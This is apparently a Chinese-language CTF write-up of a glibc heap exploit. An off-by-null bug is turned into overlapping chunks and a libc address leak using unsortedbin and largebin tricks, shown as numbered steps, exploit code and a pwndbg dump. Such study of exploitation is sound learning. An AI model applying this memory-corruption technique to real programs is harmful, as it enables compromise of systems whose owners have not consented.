1. 由于off by null的存在，创造的chunk必以0字节结尾导致无法泄露内存，所以要需要使两个堆指针指向同一个chunk，利用其中一个指针释放chunk，另一个指针泄露libc，所以该chunk必须属于unsortedbin大小
2. 需要一开始分配这个chunk，然后再通过改写使其进入unsortedbin：将这个chunk和前一个chunk合并，前一个chunk通过向后合并的方式，
3. 
4. 申请对应chunk
5. 将0，3，6放入unsortedbin中，0->3->6
6. 2，3合并，3的fd和bk依旧是指向原来的chunk
7. 将23号chunk分出0x458大小chunk，将0，6放置到largebin中，并在0x430和处伪造了一个，在使用中的fakechunk，3的size被改为0x551
8. 先将剩余的23分配，然后将0，6分配
9. 将0和23（reminderchunk）释放再分配，使得0字节覆盖掉0的bk指针的低字节0x20，指向fake chunk
10. 再依次释放：23（reminderchunk）->6->5,使5向后合并6从而保留6的指针
11. 从56中分配：分配时使23（reminderchunk）进入largebin	分配56（reminderchunk）	分配23（reminderchunk）
12. 通过释放再分配4，改写56的presize，使得56的pre指向fakechunk
13. 释放56，堆重叠

```
# 1
add(0x418) #0 A = P->fd
add(0x108 - 0x20) #1 barrier
add(0x438) #2 B0 helper
add(0x438) #3 C0 = P , P&0xff = 0
add(0x108) #4 barrier
add(0x488) # H0. helper for write bk->fd. vitcim chunk.
add(0x428) # 6 D = P->bk
add(0x108) # 7 barrier

# 2 use unsortedbin to set p->fd =A , p->bk=D
delete(0) # A
delete(3) # C0
delete(6) # D

# 3 unsortedbin: D-C0-A   C0->FD=A
delete(2) # merge B0 with C0. preserve p->fd p->bk

# 4
add(0x458, b'\x00'*0x438 + p64(0x551)[:-2])  # put A,D into largebin, split BC. use B1 to set p->size=0x551

# 5 recovery
add(0x418)  # C1 from ub
add(0x428)  # bk  D  from largebin
add(0x418)  # fd    A from largein

# 6 use unsortedbin to set fd->bk
# partial overwrite fd -> bk 
delete(6) # A=P->fd
delete(2) # C1
# unsortedbin: C1-A ,   A->BK = C1
add(0x418, p64(0))  # 2 partial overwrite bk    A->bk = p  0	2
add(0x418)		# 23 rem	6

# 7
delete(6) # A=P->fd
delete(3) # C1
delete(5)

# 8
add(0x4f8, b'\x00'*0x490)
add(0x3b0)
add(0x418)

# 9
delete(4)
add(0x108,b'\x00'*0x100 + p64(0x550))

# 10
delete(3)

# 11
add(0x10)
add(0x10) # index 6 - 8
add(0x3f8)
show(4)
libc_base = l64() - 0x219ce0
```

```
pwndbg> x/20gx 0x55976a5e32b0+0x950                                                                                                                                                                                                                                                                                   
0x55976a5e3c00: 0x0000000000000000      0x0000000000000a51
0x55976a5e3c10: 0x00007fd5f0e19ce0      0x00007fd5f0e19ce0
0x55976a5e3c20: 0x0000000000000000      0x0000000000000000
0x55976a5e3c30: 0x00007fd5f0e10061      0x00007fd5f0e1a0d0
0x55976a5e3c40: 0x000055976a5e3c20      0x000055976a5e3c20
0x55976a5e3c50: 0x0000000000000000      0x0000000000000000
0x55976a5e3c60: 0x0000000000000000      0x0000000000000000
0x55976a5e3c70: 0x0000000000000000      0x0000000000000000
0x55976a5e3c80: 0x0000000000000000      0x0000000000000000
0x55976a5e3c90: 0x0000000000000000      0x0000000000000000

```
